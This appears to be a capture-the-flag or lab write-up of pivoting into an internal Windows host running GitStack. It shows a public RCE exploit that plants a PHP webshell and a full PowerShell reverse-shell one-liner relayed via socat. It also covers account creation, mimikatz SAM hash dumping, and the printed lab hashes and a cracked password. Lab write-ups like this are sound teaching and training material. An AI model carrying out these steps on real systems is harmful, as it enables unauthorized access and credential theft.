# Github server

---

## 1.0 Pivoting trough the internal network

I downloaded a static binary of nmap on the webserver trough curl:

![Untitled](Github%20ser%20a938a/Untitled.png)

As you can see, it was successfully downloaded on the host. I also gave it the execute permissions with chmod+x so that we can actually run the static binary. Lastly, I told curl to put the output file in the /tmp directory on the compromised system.

With the following nmap command I scanned the network for hosts that are up:

![Untitled](Github%20ser%20a938a/Untitled%201.png)

The results we’re as follows:

- 10.200.57.100 (New host found)
- 10.200.57.150 (New host found)
- 10.200.57.200 (the compromised system itself)
- 10.200.57.250 (outside of this pentesting scope)

### 1.1 Scanning the new host 10.200.57.100

Command used:

![Untitled](Github%20ser%20a938a/Untitled%202.png)

- Results: All ports seem to be filtered here. So it is possible that we are not able to interact to the node from the webserver.

For now we will keep this node mind.

### 1.2 Scanning the new host 10.200.57.200

Command used:

![Untitled](Github%20ser%20a938a/Untitled%203.png)

- Results: Nmap found the following ports:
    - 80 | HTTP
    - 3389 | Possibly RDP
    - 5985 | Unkown

---

### 1.3 Using sshuttle to create a VPN connection to the new host

Command used:

![Untitled](Github%20ser%20a938a/Untitled%204.png)

As you can see, I’ve used the root id_rsa hash with SSH to create this VPN connection over SSH.

## 2.0 Nmap scan port 80

I was not able to ping the host so I started a version scan on the known port 80:

![Untitled](Github%20ser%20a938a/Untitled%205.png)

Output:

```bash
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3)
|_http-server-header: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
|_http-title: Page not found at /
```

## 2.0 Finding GitStack

A lot of services and versions. So I went to the webserver via FireFox:

![Untitled](Github%20ser%20a938a/Untitled%206.png)

- We find that the webserver tells us the following:
    
    Using the URLconf defined in app.urls, Django tried these URL patterns, in this order:
    
    ^registration/login/$
    ^gitstack/
    ^rest/
    
- So I now knew this server was running GitStack.

The default username and password (admin/admin) didn’t work on the login page:

![Untitled](Github%20ser%20a938a/Untitled%207.png)

---

### 2.1 Finding a exploit for GitStack

I used searchsploit to find a exploit for GitStack:

![Untitled](Github%20ser%20a938a/Untitled%208.png)

Results:

```bash
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                                 | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)               | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                          | php/webapps/43777.py
--------------------------------------------------------------------------------- ---------------------------------
```

- It seems that there is a RCE exploit for GitStack 2.3.10
- I decided to try the exploit after making some changes in the exploit code
    - Added a Python2.7 shebang to the code
    - Changed the target ip to 10.200.57.150
    - Renamed the exploit.php file to exploit-Incendium.php

<aside>
📌 The exploit tries to execute the command “**whoami**” by default. I will leave this alone to test the exploit.

</aside>

---

### 2.1 Running the exploit against the GitStack server

Results:

```bash
➜  Wreath ./43777.py
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work.
[+] Execute command
"nt authority\system
"
```

- As you can see the user running the webserver is nt authority\system
- We now know the exploit works!

We know have a PHP file on the webserver called exploit-Incendium.php. The webshell we have uploaded responds to a POST request using the parameter "a" (by default). We can use this from now one instead of doing the whole exploit again.

---

### 2.2 Reverse shell on the GitStack server

Since we know it is a Windows server (The user is nt authority\system) and this user is the user with the most permissions on a windows machine, we can get a reverse shell with this Powershell oneliner:

```bash
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

But I first need to test IF the GitStack server can reach my attack machine directly.

I decided to setup a tcmpdump listener on my attack box and listen for icmp packets:

```bash
sudo tcpdump -i tun0 icmp
```

Via burpsuite I sent over 3 pings to my attack box trough the exploit-Incendium.php **a** parameter:

![Untitled](Github%20ser%20a938a/Untitled%209.png)

Results from the GitStack server:

```bash
"
Pinging 10.50.55.63 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.50.55.63:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
"
```

Unfortunately, the GitStack server is not able to reach our attack machine directly. So we have to forward a shell trough the webserver running port .200.

---

### 2.3 Forwarding reverse shell with socat

First of all, I downloaded the static socat binary on the webserver while running a python webserver on my attack box listening on port 80:

```bash
curl 10.50.55.63/socat -o /tmp/socat-Incendium && chmod +x /tmp/socat-Incendium
```

Result:

![Untitled](Github%20ser%20a938a/Untitled%2010.png)

- As you can see, we now have the nmap and the socat static binaries in the /tmp folder of the webserver.

Opening a port on the webserver running Centos means that we have to allow this first in the firewall-cmd like so:

```bash
firewall-cmd --zone=public --add-port 15070/tcp
```

Results:

![Untitled](Github%20ser%20a938a/Untitled%2011.png)

Now that we opened the port in the firewall, we can start listening with socat:

```bash
./socat tcp-l:15070 tcp:10.50.55.63:443 &
```

Results:

![Untitled](Github%20ser%20a938a/Untitled%2012.png)

Now I  could start listening on port 443 on my attack machine and socat will forward anything incoming on port 15070 to my ip. This will eventually catch the reverse shell.

Entering the powershell oneliner in burpsuite + encoding it so the webserver can understand it:

- Notice the IP of the webserver (10.200.57.200)
- And notice the port (15070)

![Untitled](Github%20ser%20a938a/Untitled%2013.png)

Sending the request to the GitStack server and receiving a reverse shell on our attack machine:

![Untitled](Github%20ser%20a938a/Untitled%2014.png)

---

## 3.0 Getting GUI access with WinRM

Since we know that port 3389 and 5985 (winrm) is open, we can create a administrator account on the Windows Server and add ourselves to the remote access group:

![Untitled](Github%20ser%20a938a/Untitled%2015.png)

- As you can see, I did just that.

![Untitled](Github%20ser%20a938a/Untitled%2016.png)

---

### 3.1 Connecting to our new account with evil-winrm

Command used:

```bash
evil-winrm -u Incendium -p pwned123 -i 10.200.57.150
```

Results:

![Untitled](Github%20ser%20a938a/Untitled%2017.png)

- As you can see, we are now connected to the new account made with a WinRM shell.

### 3.2 Connecting to the GUI via xfreerdp

Command used:

```bash
xfreerdp /v:10.200.57.150 /u:Incendium /p:'pwned123' /drive:/usr/share/windows-resources,share
```

- Note the /drive: parameter
    - We use this to connect a local folder from our attack machine as a share on the target machine. This is very useful because, we don’t need to install any tools on the Windows server now.
    
    ![Untitled](Github%20ser%20a938a/Untitled%2018.png)
    

Results:

![Untitled](Github%20ser%20a938a/Untitled%2019.png)

- We are now connected to the GUI of this Windows Server 2019

---

## 4.0 Dumping hashes with mimikatz

With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target.

Running mimikatz from a cmd administrator command prompt:

```bash
\\tsclient\share\mimikatz\x64\mimikatz.exe
```

Results:

![Untitled](Github%20ser%20a938a/Untitled%2020.png)

Checking privileges:

```bash
privilege::debug
```

Results:

![Untitled](Github%20ser%20a938a/Untitled%2021.png)

Elevate integrity to SYSTEM level:

```bash
token::elevate
```

Results:

![Untitled](Github%20ser%20a938a/Untitled%2022.png)

Dumping the local SAM hashes:

```bash
lsadump::sam
```

Results:

![Untitled](Github%20ser%20a938a/Untitled%2023.png)

Hash of Thomas: 02d90eda8f6b6b06c32d5f207831101f

Hash of Administrator: 37db630168e5f82aafa8461e05c6bbd1

---

### 5.0 Cracking the NTLM hash of Thomas

I used [https://crackstation.net/](https://crackstation.net/) to crack the password of Thomas:

![Untitled](Github%20ser%20a938a/Untitled%2024.png)

Password: i<3ruby

---